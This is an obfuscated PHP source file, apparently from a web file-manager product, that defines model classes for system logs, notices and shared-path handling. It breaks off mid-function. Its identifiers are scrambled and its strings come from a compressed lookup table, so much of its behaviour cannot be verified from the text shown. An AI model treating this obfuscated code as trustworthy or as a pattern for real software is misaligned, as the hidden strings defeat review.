<?php
 goto Bè±£‘¤¦»; f°ïİõåÇ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\x4c\x69\147\150\x74\x41\x70\160"; public $modelType = "\123\171\163\164\x65\155\117\160\164\x69\x6f\x6e"; public $field = array("\156\141\155\145", "\147\162\x6f\165\160", "\x64\145\x73\143", "\x63\x6f\156\x74\145\156\x74"); public function listData($¦ÔïÜÖ’ = false, $¢şúÕçÈ = "\155\157\144\x69\x66\171\124\151\x6d\145", $¡Ü—´íÅ = true) { return parent::listData($¦ÔïÜÖ’, $¢şúÕçÈ, $¡Ü—´íÅ); } public function remove($ÑéçŞÁõ) { $†ÈµÀ¢ = $this->findByName($ÑéçŞÁõ); if (!$†ÈµÀ¢) { return !1; } return parent::remove($†ÈµÀ¢[$_SERVER[°‰†òö¯][477]]); } public function add($›Ü¸ê©ğ) { if ($this->findByName($›Ü¸ê©ğ[$_SERVER[°‰†òö¯][32]])) { return !1; } return parent::insert($›Ü¸ê©ğ); } public function update($°åÖÉ§ë, $†Ô‰ëÌª) { $›£Ó„ô =& $_SERVER[°‰†òö¯]; $»îãòŒÎ = $this->findByName($°åÖÉ§ë); $ÔÌÈ“ªå = $this->findByName($†Ô‰ëÌª[$›£Ó„ô[32]]); if (!$»îãòŒÎ || $ÔÌÈ“ªå && $ÔÌÈ“ªå[$›£Ó„ô[477]] != $»îãòŒÎ[$›£Ó„ô[477]]) { return !1; } return parent::update($»îãòŒÎ[$›£Ó„ô[477]], $†Ô‰ëÌª); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\155\137\x6c\157\147"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\124\x69\155\145", "\164\x69\x6d\145", "\x69\156\163\145\162\x74", "\x66\x75\156\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Çâ’“ =& $_SERVER[°‰†òö¯]; return array($Çâ’“[2346] => LNG($Çâ’“[2347]), $Çâ’“[2348] => LNG($Çâ’“[2349]), $Çâ’“[1914] => LNG($Çâ’“[2350]), $Çâ’“[2351] => LNG($Çâ’“[2352]), $Çâ’“[2353] => LNG($Çâ’“[2354]), $Çâ’“[2355] => LNG($Çâ’“[2356]), $Çâ’“[2357] => LNG($Çâ’“[2358]), $Çâ’“[1944] => LNG($Çâ’“[2358]), $Çâ’“[1945] => LNG($Çâ’“[2359]), $Çâ’“[2360] => LNG($Çâ’“[2361]), $Çâ’“[2362] => LNG($Çâ’“[2363]), $Çâ’“[2364] => LNG($Çâ’“[2365]), $Çâ’“[2366] => LNG($Çâ’“[2367]), $Çâ’“[1942] => LNG($Çâ’“[2368]), $Çâ’“[2369] => LNG($Çâ’“[2370]), $Çâ’“[1949] => LNG($Çâ’“[2371]), $Çâ’“[2372] => LNG($Çâ’“[2373]), $Çâ’“[2374] => LNG($Çâ’“[2375]), $Çâ’“[2376] => LNG($Çâ’“[2377]), $Çâ’“[2378] => LNG($Çâ’“[2379]), $Çâ’“[1952] => LNG($Çâ’“[2380]), $Çâ’“[1953] => LNG($Çâ’“[2381]), $Çâ’“[2382] => LNG($Çâ’“[2383]), $Çâ’“[2384] => LNG($Çâ’“[2385]), $Çâ’“[2386] => LNG($Çâ’“[2387]), $Çâ’“[1947] => LNG($Çâ’“[2388]), $Çâ’“[2389] => LNG($Çâ’“[2390]), $Çâ’“[1946] => LNG($Çâ’“[2391]), $Çâ’“[2392] => LNG($Çâ’“[2393]), $Çâ’“[2394] => LNG($Çâ’“[2395]), $Çâ’“[2396] => LNG($Çâ’“[2395]), $Çâ’“[2397] => LNG($Çâ’“[2398]), $Çâ’“[2399] => LNG($Çâ’“[2399]), $Çâ’“[2400] => LNG($Çâ’“[1918]), $Çâ’“[2401] => LNG($Çâ’“[2402]), $Çâ’“[2403] => LNG($Çâ’“[2404]), $Çâ’“[2405] => LNG($Çâ’“[2406]), $Çâ’“[2407] => LNG($Çâ’“[2408]), $Çâ’“[2409] => LNG($Çâ’“[2410]), $Çâ’“[2411] => LNG($Çâ’“[2411]), $Çâ’“[2412] => LNG($Çâ’“[2413]), $Çâ’“[2414] => LNG($Çâ’“[2415]), $Çâ’“[2416] => LNG($Çâ’“[2417]), $Çâ’“[2418] => LNG($Çâ’“[2419]), $Çâ’“[2420] => LNG($Çâ’“[2421]), $Çâ’“[2422] => LNG($Çâ’“[2423]), $Çâ’“[212] => LNG($Çâ’“[212]), $Çâ’“[213] => LNG($Çâ’“[2424]), $Çâ’“[2425] => LNG($Çâ’“[2425])); } private function typeFile() { $ğã‘¤¥ß =& $_SERVER[°‰†òö¯]; $‘ğ´©›¦ = array($ğã‘¤¥ß[1949] => array($ğã‘¤¥ß[1950]), $ğã‘¤¥ß[2364] => array($ğã‘¤¥ß[2426]), $ğã‘¤¥ß[2366] => array($ğã‘¤¥ß[2427]), $ğã‘¤¥ß[1942] => array($ğã‘¤¥ß[1943], $ğã‘¤¥ß[2428]), $ğã‘¤¥ß[2374] => array(), $ğã‘¤¥ß[2376] => array(), $ğã‘¤¥ß[2378] => array(), $ğã‘¤¥ß[1952] => array($ğã‘¤¥ß[1954]), $ğã‘¤¥ß[1953] => array($ğã‘¤¥ß[1954]), $ğã‘¤¥ß[2382] => array($ğã‘¤¥ß[2429]), $ğã‘¤¥ß[2384] => array($ğã‘¤¥ß[2429]), $ğã‘¤¥ß[2386] => array($ğã‘¤¥ß[2430]), $ğã‘¤¥ß[2372] => array($ğã‘¤¥ß[2431]), $ğã‘¤¥ß[1947] => array($ğã‘¤¥ß[2432]), $ğã‘¤¥ß[2389] => array($ğã‘¤¥ß[2433]), $ğã‘¤¥ß[1946] => array($ğã‘¤¥ß[1948])); return $‘ğ´©›¦; } private function typeAll() { $Î°‘„À‡ =& $_SERVER[°‰†òö¯]; $ÈÑšÔĞ = $this->typeList; $ÆøäÆ¾¥ = array_filter($this->typeFile()); foreach ($ÆøäÆ¾¥ as $Šñëïø => $®×êŒáÌ) { $ÈÑšÔĞ[$®×êŒáÌ[0]] = $ÈÑšÔĞ[$Šñëïø]; } $ÈÑšÔĞ[$Î°‘„À‡[1954]] = LNG($Î°‘„À‡[2434]); $ÈÑšÔĞ[$Î°‘„À‡[2429]] = LNG($Î°‘„À‡[2435]); return $ÈÑšÔĞ; } public function addLog($®Ù´õıï, $½Ù¬àßÒ = array()) { $ìüÔş¨¥ =& $_SERVER[°‰†òö¯]; if (!isset($this->typeList[$®Ù´õıï])) { return; } $ğÂü×Å‰ = Session::get($ìüÔş¨¥[2113]); if (!$ğÂü×Å‰) { $ğÂü×Å‰ = _get($½Ù¬àßÒ, $ìüÔş¨¥[1771], 0); } if ($®Ù´õıï == $ìüÔş¨¥[2401] && is_array($½Ù¬àßÒ[$ìüÔş¨¥[2436]]) && !$½Ù¬àßÒ[$ìüÔş¨¥[2436]]) { return; } $Ã­À²Š = get_client_ip(); if (!$½Ù¬àßÒ || strlen(json_encode($½Ù¬àßÒ)) >= 1024 * 64) { if ($½Ù¬àßÒ && is_array($½Ù¬àßÒ)) { $½Ù¬àßÒ = array_intersect_key($½Ù¬àßÒ, array_flip($ìüÔş¨¥[477], $ìüÔş¨¥[32])); $½Ù¬àßÒ[$ìüÔş¨¥[2437]] = $Ã­À²Š; } else { $½Ù¬àßÒ = array($ìüÔş¨¥[2437] => $Ã­À²Š); } } else { if (is_array($½Ù¬àßÒ)) { $½Ù¬àßÒ[$ìüÔş¨¥[2437]] = $Ã­À²Š; } else { $½Ù¬àßÒ = array($ìüÔş¨¥[1285] => $½Ù¬àßÒ, $ìüÔş¨¥[2437] => $Ã­À²Š); } } $½Ù¬àßÒ = array($ìüÔş¨¥[1761] => Session::sign(), $ìüÔş¨¥[1762] => intval($ğÂü×Å‰), $ìüÔş¨¥[33] => $®Ù´õıï, $ìüÔş¨¥[1764] => json_encode($½Ù¬àßÒ)); return parent::add($½Ù¬àßÒ); } public function remove($å¾èıà¿) { $this->where(array($_SERVER[°‰†òö¯][495] => $å¾èıà¿))->delete(); } private function _makeOrder($µš¼À° = '') { $€Ì»’š =& $_SERVER[°‰†òö¯]; $šÉ´“Ñ° = $€Ì»’š[233]; $èªéÁ›É = array($€Ì»’š[525] => $€Ì»’š[526], $€Ì»’š[527] => $€Ì»’š[528]); $é§öï = Input::get($€Ì»’š[533], $€Ì»’š[7], $€Ì»’š[2153], array($€Ì»’š[2067], $€Ì»’š[527])); $é§öï = $èªéÁ›É[$é§öï]; $µš¼À° = $µš¼À° . "{$šÉ´“Ñ°}\40{$é§öï}"; return $this->order($µš¼À°); } public function get($…”óÕÉ‹ = '') { $şŒæ„™÷ =& $_SERVER[°‰†òö¯]; if (!$…”óÕÉ‹) { show_json(array()); } $À›õŞÃ³ = array(); if ($…”óÕÉ‹[$şŒæ„™÷[1771]]) { $À›õŞÃ³[$şŒæ„™÷[1771]] = $…”óÕÉ‹[$şŒæ„™÷[1771]]; } if (isset($…”óÕÉ‹[$şŒæ„™÷[821]])) { $£õïğ· = $…”óÕÉ‹[$şŒæ„™÷[821]]; $ÕØ­†ÔÉ = isset($…”óÕÉ‹[$şŒæ„™÷[822]]) ? $…”óÕÉ‹[$şŒæ„™÷[822]] : time(); $À›õŞÃ³[$şŒæ„™÷[233]] = array($şŒæ„™÷[410], array($£õïğ·, $ÕØ­†ÔÉ)); } if ($…”óÕÉ‹[$şŒæ„™÷[33]]) { $ğ•”¸‚© = explode($şŒæ„™÷[50], $…”óÕÉ‹[$şŒæ„™÷[33]]); $™…¿ñµß = $this->typeFile(); $Ğåó»‚ = array(); foreach ($ğ•”¸‚© as $ı¡ÒîÙ½) { $Ğåó»‚[] = $ı¡ÒîÙ½; if (isset($™…¿ñµß[$ı¡ÒîÙ½])) { $Ğåó»‚ = array_merge($Ğåó»‚, $™…¿ñµß[$ı¡ÒîÙ½]); } } $Ğåó»‚ = array_unique($Ğåó»‚); if ($Ğåó»‚) { $À›õŞÃ³[$şŒæ„™÷[33]] = array($şŒæ„™÷[7], $Ğåó»‚); } } else { $À›õŞÃ³[$şŒæ„™÷[33]] = array($şŒæ„™÷[2438], $şŒæ„™÷[2439]); } if (!empty($…”óÕÉ‹[$şŒæ„™÷[2437]])) { $À›õŞÃ³[$şŒæ„™÷[528]] = array($şŒæ„™÷[461], "\45{$…”óÕÉ‹[$şŒæ„™÷[2437]]}\x25"); } $¼²š†è° = $this->_makeOrder()->where($À›õŞÃ³)->selectPage(); if (empty($¼²š†è°[$şŒæ„™÷[447]])) { show_json(array(), !0, $¼²š†è°[$şŒæ„™÷[444]]); } $¼²š†è°[$şŒæ„™÷[447]] = $this->logList($¼²š†è°[$şŒæ„™÷[447]]); return $¼²š†è°; } private function ipAddress(&$Û»äĞÄ) { $õ®­¾¬ =& $_SERVER[°‰†òö¯]; if (!empty($Û»äĞÄ[$õ®­¾¬[2437]])) { $ÉŒ‡İàŠ = IpLocation::get($Û»äĞÄ[$õ®­¾¬[2437]]); } else { $ÉŒ‡İàŠ = LNG($õ®­¾¬[2440]); } $Û»äĞÄ[$õ®­¾¬[2441]] = $ÉŒ‡İàŠ; } private function descZipDownload($£ûÃÃ‹á, &$ÂÛûšı±) { $áşÌ•êÇ =& $_SERVER[°‰†òö¯]; if (!isset($£ûÃÃ‹á[$áşÌ•êÇ[2442]])) { return; } $™†’«ç€ = json_decode($£ûÃÃ‹á[$áşÌ•êÇ[2442]], !0); foreach ($™†’«ç€ as $Ç’“»â) { try { $Ò«í¾Í = IO::infoFullSimple($Ç’“»â[$áşÌ•êÇ[87]]); } catch (Exception $Ê“ÉÈ˜ç) { continue; } $£ûÃÃ‹á[$áşÌ•êÇ[87]] = $Ç’“»â[$áşÌ•êÇ[87]]; $ÂÛûšı±[] = $£ûÃÃ‹á[$áşÌ•êÇ[193]] = $Ò«í¾Í[$áşÌ•êÇ[193]]; $ÂÛûšı±[] = $£ûÃÃ‹á[$áşÌ•êÇ[2209]] = $Ò«í¾Í[$áşÌ•êÇ[192]]; break; } return $£ûÃÃ‹á; } private function getSourceList(&$ßğèöÀ) { $–öÀ¾½€ =& $_SERVER[°‰†òö¯]; $úÂ°µ¿ë = array(); foreach ($ßğèöÀ as $Ûı‚øß => $ñÉÌæÄ) { $˜‰ş¥… = json_decode($ñÉÌæÄ[$–öÀ¾½€[528]], !0); if ($ñÉÌæÄ[$–öÀ¾½€[33]] == $–öÀ¾½€[1945]) { $˜‰ş¥… = $this->descZipDownload($˜‰ş¥…, $úÂ°µ¿ë); $ßğèöÀ[$Ûı‚øß][$–öÀ¾½€[528]] = json_encode($˜‰ş¥…); continue; } if (strpos($ñÉÌæÄ[$–öÀ¾½€[33]], $–öÀ¾½€[2211]) !== 0) { if (!isset($˜‰ş¥…[$–öÀ¾½€[87]]) || strpos($ñÉÌæÄ[$–öÀ¾½€[33]], $–öÀ¾½€[2443]) !== 0) { continue; } try { $ã¸¤õ•ü = IO::infoFullSimple($˜‰ş¥…[$–öÀ¾½€[87]]); } catch (Exception $Õ°¿½¿Ê) { continue; } $úÂ°µ¿ë[] = $˜‰ş¥…[$–öÀ¾½€[193]] = $ã¸¤õ•ü[$–öÀ¾½€[193]]; $úÂ°µ¿ë[] = $˜‰ş¥…[$–öÀ¾½€[2209]] = $ã¸¤õ•ü[$–öÀ¾½€[192]]; $ßğèöÀ[$Ûı‚øß][$–öÀ¾½€[528]] = json_encode($˜‰ş¥…); continue; } $úÂ°µ¿ë[] = $˜‰ş¥…[$–öÀ¾½€[193]]; $úÂ°µ¿ë[] = $˜‰ş¥…[$–öÀ¾½€[2209]]; if ($˜‰ş¥…[$–öÀ¾½€[33]] == $–öÀ¾½€[627]) { $úÂ°µ¿ë[] = $˜‰ş¥…[$–öÀ¾½€[528]][$–öÀ¾½€[1239]]; $úÂ°µ¿ë[] = $˜‰ş¥…[$–öÀ¾½€[528]][$–öÀ¾½€[1240]]; } if ($˜‰ş¥…[$–öÀ¾½€[33]] == $–öÀ¾½€[2220]) { $úÂ°µ¿ë[] = $˜‰ş¥…[$–öÀ¾½€[528]][$–öÀ¾½€[193]]; } } if (!$úÂ°µ¿ë) { return array(); } return Model($–öÀ¾½€[891])->sourceListInfo($úÂ°µ¿ë, !0); } private function logList($à’ìÖÄ÷) { $åÛ©ö’Ÿ =& $_SERVER[°‰†òö¯]; $Ú¨«¶¾ = array_to_keyvalue($à’ìÖÄ÷, $åÛ©ö’Ÿ[12], $åÛ©ö’Ÿ[1771]); $ÚŸœ¨áê = Model($åÛ©ö’Ÿ[601])->userListInfo(array_unique($Ú¨«¶¾)); $ş´†Ÿùƒ = $this->getSourceList($à’ìÖÄ÷); $ÂáşŠÃÍ = $this->typeAll(); $òğ¹º®ã = array(); $‰šß¨Ï = array(); foreach ($à’ìÖÄ÷ as $Áªå‹¦ => $„ª„î§·) { $¤ÉàÅõ = $„ª„î§·[$åÛ©ö’Ÿ[33]]; $—­Ûªš = isset($ÚŸœ¨áê[$„ª„î§·[$åÛ©ö’Ÿ[1771]]]) ? $ÚŸœ¨áê[$„ª„î§·[$åÛ©ö’Ÿ[1771]]] : !1; $ùïŸ‡ËÃ = strpos($¤ÉàÅõ, $åÛ©ö’Ÿ[2444]) === 0 ? LNG($åÛ©ö’Ÿ[2445]) : LNG($åÛ©ö’Ÿ[2440]); $„ª„î§·[$åÛ©ö’Ÿ[32]] = isset($—­Ûªš[$åÛ©ö’Ÿ[32]]) ? $—­Ûªš[$åÛ©ö’Ÿ[32]] : LNG($åÛ©ö’Ÿ[2440]); $„ª„î§·[$åÛ©ö’Ÿ[2271]] = isset($—­Ûªš[$åÛ©ö’Ÿ[2271]]) ? $—­Ûªš[$åÛ©ö’Ÿ[2271]] : $åÛ©ö’Ÿ[12]; $„ª„î§·[$åÛ©ö’Ÿ[1659]] = isset($ÂáşŠÃÍ[$¤ÉàÅõ]) ? $ÂáşŠÃÍ[$¤ÉàÅõ] : $ùïŸ‡ËÃ; $„ª„î§·[$åÛ©ö’Ÿ[2152]] = $—­Ûªš; $ö÷ëÍ†â = json_decode($„ª„î§·[$åÛ©ö’Ÿ[528]], !0); $„ª„î§·[$åÛ©ö’Ÿ[2437]] = isset($ö÷ëÍ†â[$åÛ©ö’Ÿ[2437]]) ? $ö÷ëÍ†â[$åÛ©ö’Ÿ[2437]] : $åÛ©ö’Ÿ[12]; $„ª„î§·[$åÛ©ö’Ÿ[2441]] = IpLocation::get($„ª„î§·[$åÛ©ö’Ÿ[2437]]); if (strpos($¤ÉàÅõ, $åÛ©ö’Ÿ[2211]) === 0 || isset($ö÷ëÍ†â[$åÛ©ö’Ÿ[2209]])) { $ö÷ëÍ†â[$åÛ©ö’Ÿ[90]] = $ş´†Ÿùƒ[$ö÷ëÍ†â[$åÛ©ö’Ÿ[193]]]; $ö÷ëÍ†â[$åÛ©ö’Ÿ[2225]] = $ş´†Ÿùƒ[$ö÷ëÍ†â[$åÛ©ö’Ÿ[2209]]]; if ($ö÷ëÍ†â[$åÛ©ö’Ÿ[33]] == $åÛ©ö’Ÿ[627]) { $ö÷ëÍ†â[$åÛ©ö’Ÿ[528]][$åÛ©ö’Ÿ[1239]] = $ş´†Ÿùƒ[$ö÷ëÍ†â[$åÛ©ö’Ÿ[528]][$åÛ©ö’Ÿ[1239]]]; $ö÷ëÍ†â[$åÛ©ö’Ÿ[528]][$åÛ©ö’Ÿ[1240]] = $ş´†Ÿùƒ[$ö÷ëÍ†â[$åÛ©ö’Ÿ[528]][$åÛ©ö’Ÿ[1240]]]; } if ($ö÷ëÍ†â[$åÛ©ö’Ÿ[33]] == $åÛ©ö’Ÿ[2220]) { $ö÷ëÍ†â[$åÛ©ö’Ÿ[528]][$åÛ©ö’Ÿ[193]] = $ş´†Ÿùƒ[$ö÷ëÍ†â[$åÛ©ö’Ÿ[528]][$åÛ©ö’Ÿ[193]]]; } if ($ö÷ëÍ†â[$åÛ©ö’Ÿ[33]] == $åÛ©ö’Ÿ[1940]) { $ö÷ëÍ†â[$åÛ©ö’Ÿ[2225]] = $ö÷ëÍ†â[$åÛ©ö’Ÿ[90]]; $ö÷ëÍ†â[$åÛ©ö’Ÿ[2209]] = $ö÷ëÍ†â[$åÛ©ö’Ÿ[2225]][$åÛ©ö’Ÿ[193]]; $ö÷ëÍ†â[$åÛ©ö’Ÿ[90]] = !1; $ö÷ëÍ†â[$åÛ©ö’Ÿ[193]] = $åÛ©ö’Ÿ[12]; } $ìƒœ´ü‚ = array($åÛ©ö’Ÿ[1940], $åÛ©ö’Ÿ[2207]); if (!in_array($ö÷ëÍ†â[$åÛ©ö’Ÿ[33]], $ìƒœ´ü‚)) { if ($ö÷ëÍ†â[$åÛ©ö’Ÿ[90]] && $ö÷ëÍ†â[$åÛ©ö’Ÿ[90]][$åÛ©ö’Ÿ[190]] == $åÛ©ö’Ÿ[191]) { $‰šß¨Ï[] = $„ª„î§·[$åÛ©ö’Ÿ[477]]; unset($à’ìÖÄ÷[$Áªå‹¦]); continue; } if ($ö÷ëÍ†â[$åÛ©ö’Ÿ[2225]] && $ö÷ëÍ†â[$åÛ©ö’Ÿ[2225]][$åÛ©ö’Ÿ[190]] == $åÛ©ö’Ÿ[191]) { $‰šß¨Ï[] = $„ª„î§·[$åÛ©ö’Ÿ[477]]; unset($à’ìÖÄ÷[$Áªå‹¦]); continue; } } } $„ª„î§·[$åÛ©ö’Ÿ[528]] = $ö÷ëÍ†â; unset($„ª„î§·[$åÛ©ö’Ÿ[2446]]); $òğ¹º®ã[] = $„ª„î§·; } $this->clearSystemPathLog($‰šß¨Ï); return $òğ¹º®ã; } private function clearSystemPathLog($Ø„üàŠº) { $ˆˆ‚—Ñ =& $_SERVER[°‰†òö¯]; if (count($Ø„üàŠº) == 0) { return; } $ä±‚†ÃÓ = array($ˆˆ‚—Ñ[477] => array($ˆˆ‚—Ñ[7], array_unique($Ø„üàŠº))); $this->where($ä±‚†ÃÓ)->delete(); } public function deviceList($­œÕÄÖ‰, $†Ë‚ŸÎÌ = 0) { $ŸâÖ°°± =& $_SERVER[°‰†òö¯]; $ûîšÉµï = array($ŸâÖ°°±[1771] => $­œÕÄÖ‰, $ŸâÖ°°±[233] => array($ŸâÖ°°±[1089], $†Ë‚ŸÎÌ), $ŸâÖ°°±[33] => $ŸâÖ°°±[1914]); $µˆæææÙ = array(); $ßş‡ï°¾ = $this->field($ŸâÖ°°±[2447])->where($ûîšÉµï)->order($ŸâÖ°°±[2223])->limit(50)->select(); foreach ($ßş‡ï°¾ as $ğşí½âÆ => $ôÒÌş–) { if ($ğşí½âÆ > 0 && abs($ôÒÌş–[$ŸâÖ°°±[233]] - $ßş‡ï°¾[$ğşí½âÆ - 1][$ŸâÖ°°±[233]]) < 5) { continue; } $Ê‚„Ü•‚ = json_decode($ôÒÌş–[$ŸâÖ°°±[528]], !0); $ôÒÌş–[$ŸâÖ°°±[2437]] = isset($Ê‚„Ü•‚[$ŸâÖ°°±[2437]]) ? $Ê‚„Ü•‚[$ŸâÖ°°±[2437]] : $ŸâÖ°°±[12]; unset($Ê‚„Ü•‚[$ŸâÖ°°±[2437]]); $ˆÒœäô° = $this->deviceType($Ê‚„Ü•‚[$ŸâÖ°°±[2212]]); if (isset($µˆæææÙ[$ˆÒœäô°])) { continue; } $ôÒÌş–[$ŸâÖ°°±[2441]] = IpLocation::get($ôÒÌş–[$ŸâÖ°°±[2437]]); $ôÒÌş–[$ŸâÖ°°±[528]] = $Ê‚„Ü•‚; $µˆæææÙ[$ˆÒœäô°] = $ôÒÌş–; } return array_values($µˆæææÙ); } public function deviceType($ØäçÂ„Ù) { return $ØäçÂ„Ù; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\x6e\x6f\164\151\x63\145\114\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\x63\x6f\x6e\x74\145\156\x74", "\141\x75\x74\x68", "\x6d\x6f\x64\x65", "\164\x69\155\145", "\164\171\160\x65", "\x6c\145\166\x65\154", "\145\156\x61\x62\154\145", "\x73\x6f\162\164"); public function listData($¢ÁÕ¹ï = false, $½œÜÕ„ø = "\163\157\x72\164", $È³£ÑË = false) { return parent::listData($¢ÁÕ¹ï, $½œÜÕ„ø, $È³£ÑË); } public function add($¨õŒè¸ù) { $Ì¦ûÒú =& $_SERVER[°‰†òö¯]; $òº•íæ© = time(); if ($¨õŒè¸ù[$Ì¦ûÒú[16]] == $Ì¦ûÒú[2448]) { $òº•íæ© = strtotime($¨õŒè¸ù[$Ì¦ûÒú[206]]); } $¨õŒè¸ù[$Ì¦ûÒú[206]] = $òº•íæ©; return parent::insert($¨õŒè¸ù); } public function update($é½±—ì, $Äüôµö±) { $ÆìÊÄö· =& $_SERVER[°‰†òö¯]; $‡ï‹ˆää = $this->listData($é½±—ì); if (!$‡ï‹ˆää) { return !1; } $œ¥›õ­ = time(); if ($Äüôµö±[$ÆìÊÄö·[16]] == $ÆìÊÄö·[2448]) { $œ¥›õ­ = strtotime($Äüôµö±[$ÆìÊÄö·[206]]); } $Äüôµö±[$ÆìÊÄö·[206]] = $œ¥›õ­; return parent::update($é½±—ì, $Äüôµö±); } public function remove($–âËü€ı) { $˜÷ê—“ = $this->listData($–âËü€ı); if (!$˜÷ê—“ || $˜÷ê—“[$_SERVER[°‰†òö¯][191]]) { return !1; } return parent::remove($–âËü€ı); } public function sort($Šé¤ãóë, $ÏÑ…·ı²) { return parent::update($Šé¤ãóë, $ÏÑ…·ı²); } public function enable($Î‘ÂİÀ‡, $è¹¢Ñ§) { return parent::update($Î‘ÂİÀ‡, array($_SERVER[°‰†òö¯][2449] => $è¹¢Ñ§)); } private function initUserOption() { $È‘ìÔšİ =& $_SERVER[°‰†òö¯]; $this->optionType = $È‘ìÔšİ[2450]; $this->modelType = $È‘ìÔšİ[2451]; $this->field = array($È‘ìÔšİ[2452], $È‘ìÔšİ[32], $È‘ìÔšİ[206], $È‘ìÔšİ[33], $È‘ìÔšİ[2453], $È‘ìÔšİ[811], $È‘ìÔšİ[228]); } public function userNoticeGet($’¤‹Àü‡ = false) { $this->initUserOption(); return parent::listData($’¤‹Àü‡, $_SERVER[°‰†òö¯][477], !0); } public function userNoticeAdd($£Ê¬“Æ) { $‡ÜØ‡Ä¨ =& $_SERVER[°‰†òö¯]; $this->initUserOption(); $åÉª³±¿ = $this->findByKey($‡ÜØ‡Ä¨[2452], $£Ê¬“Æ[$‡ÜØ‡Ä¨[477]]); if ($åÉª³±¿) { return !0; } $İÛ×§Ô… = array($‡ÜØ‡Ä¨[2452] => $£Ê¬“Æ[$‡ÜØ‡Ä¨[477]], $‡ÜØ‡Ä¨[32] => $£Ê¬“Æ[$‡ÜØ‡Ä¨[32]], $‡ÜØ‡Ä¨[206] => $£Ê¬“Æ[$‡ÜØ‡Ä¨[206]], $‡ÜØ‡Ä¨[33] => isset($£Ê¬“Æ[$‡ÜØ‡Ä¨[33]]) ? $£Ê¬“Æ[$‡ÜØ‡Ä¨[33]] : 1, $‡ÜØ‡Ä¨[2453] => isset($£Ê¬“Æ[$‡ÜØ‡Ä¨[2453]]) ? $£Ê¬“Æ[$‡ÜØ‡Ä¨[2453]] : 0, $‡ÜØ‡Ä¨[811] => 0, $‡ÜØ‡Ä¨[228] => 0); return parent::insert($İÛ×§Ô…); } public function userNoticeEdit($Çá‹É, $Ñ¹±Ô¼) { $this->initUserOption(); return parent::update($Çá‹É, $Ñ¹±Ô¼); } } goto b…ëÎ™¦§İ; cÃï¸: define($_SERVER[°‰†òö¯][0], $_SERVER[°‰†òö¯][1]); $_SERVER[É¶É–øÑ] = explode($_SERVER[°‰†òö¯][2], gzinflate(substr($_SERVER[°‰†òö¯][3], 10, -8))); function binCheckEq($²†‘äƒé, $¼„ùåŠ) { return $²†‘äƒé == $¼„ùåŠ; } goto A›ÓŸÒ“¦œ; dèºÀ’í±ï: class PathDriverDriverShareItem { public function __construct($ÄÍèÔ¤) { $this->pathParse = $ÄÍèÔ¤; } public function __call($ô–…®õä, $©§®½á­) { $ü™İ»Û… =& $_SERVER[°‰†òö¯]; if (method_exists($this, $ô–…®õä)) { return; } $ˆı€¢ü = call_user_func_array(array($ü™İ»Û…[1428], $ô–…®õä), $©§®½á­); $ñà¼¤Øò = array($ü™İ»Û…[1429], $ü™İ»Û…[1430], $ü™İ»Û…[1431], $ü™İ»Û…[1432], $ü™İ»Û…[625], $ü™İ»Û…[627], $ü™İ»Û…[1433], $ü™İ»Û…[110], $ü™İ»Û…[1434], $ü™İ»Û…[1435]); if (in_array($ô–…®õä, $ñà¼¤Øò)) { $ˆı€¢ü = $this->getPathOuter($ˆı€¢ü); } return $ˆı€¢ü; } public function copy($™ë —Ìñ, $óùßÜ™Õ, $¤ ¿®©Æ = false, $´üµ¼æ‘ = false) { return $this->copyMove($™ë —Ìñ, $óùßÜ™Õ, $¤ ¿®©Æ, $_SERVER[°‰†òö¯][625], $´üµ¼æ‘); } public function move($ØùøÙ«ç, $ö²¯»®®, $³øÖ¤Å = false, $º½±Í¹ = false) { return $this->copyMove($ØùøÙ«ç, $ö²¯»®®, $³øÖ¤Å, $_SERVER[°‰†òö¯][627], $º½±Í¹); } private function copyMove($èŠØÃÈ, $ÌÎï¿Ö, $öÁå™•, $¾÷ÉéÍ, $¨ƒú‹¡Ğ = false) { $÷©¨Â¤ =& $_SERVER[°‰†òö¯]; $‘îé½ÖÙ = $ÌÎï¿Ö; $ğÛëìÇ = IO::driverMake($ÌÎï¿Ö); if ($ğÛëìÇ->pathParse[$÷©¨Â¤[1230]]) { $ÌÎï¿Ö = $ğÛëìÇ->pathParse[$÷©¨Â¤[1230]]; } else { $ÌÎï¿Ö = $‘îé½ÖÙ; } $°°Ô†øù = IO::copyMove($èŠØÃÈ, $ÌÎï¿Ö, $öÁå™•, $¾÷ÉéÍ, $¨ƒú‹¡Ğ); $°°Ô†øù = $this->getPathOuter($°°Ô†øù); return $°°Ô†øù; } public function pathThis($Š“«Â§) { return get_path_this($this->pathParse[$_SERVER[°‰†òö¯][87]]); } public function pathFather($¯×Ò“™) { return get_path_father($this->pathParse[$_SERVER[°‰†òö¯][87]]); } public function iconvSystem($”æ›¬ÉÌ) { return $”æ›¬ÉÌ; } protected function infoParse($¥Ì¨±ªŒ, $—ƒø³Ç÷ = false) { $æäÅÌÕŠ =& $_SERVER[°‰†òö¯]; $ŒÎª€´Ñ = $this->pathParse[$æäÅÌÕŠ[564]][$æäÅÌÕŠ[1255]] . $this->pathParse[$æäÅÌÕŠ[1248]]; if ($—ƒø³Ç÷) { $¤ê°£‹Æ = IO::infoWithChildren($ŒÎª€´Ñ); } else { $¤ê°£‹Æ = IO::info($ŒÎª€´Ñ); } $Âã¢ää¤ = $this->pathParse[$æäÅÌÕŠ[564]]; return Action($æäÅÌÕŠ[1426])->_shareItemeParse($¤ê°£‹Æ, $Âã¢ää¤); } public function listAll($¥éç¦È) { $Ÿ‰†ğÄ =& $_SERVER[°‰†òö¯]; $‘ø¯ŸèÚ = IO::listAll($¥éç¦È); $‰€¸çã˜ = rtrim($this->pathParse[$Ÿ‰†ğÄ[564]][$Ÿ‰†ğÄ[1255]], $Ÿ‰†ğÄ[8]); foreach ($‘ø¯ŸèÚ as &$áŠî²º—) { $áŠî²º—[$Ÿ‰†ğÄ[87]] = $this->pathDriver . $Ÿ‰†ğÄ[8] . ltrim(substr($áŠî²º—[$Ÿ‰†ğÄ[87]], strlen($‰€¸çã˜)), $Ÿ‰†ğÄ[8]); } unset($áŠî²º—); return $‘ø¯ŸèÚ; } public function listAllSimple($ÔşÁ‘©§, $÷–àÉæ = false) { $ŒŠëøÀ– =& $_SERVER[°‰†òö¯]; $âŠ€”­ = 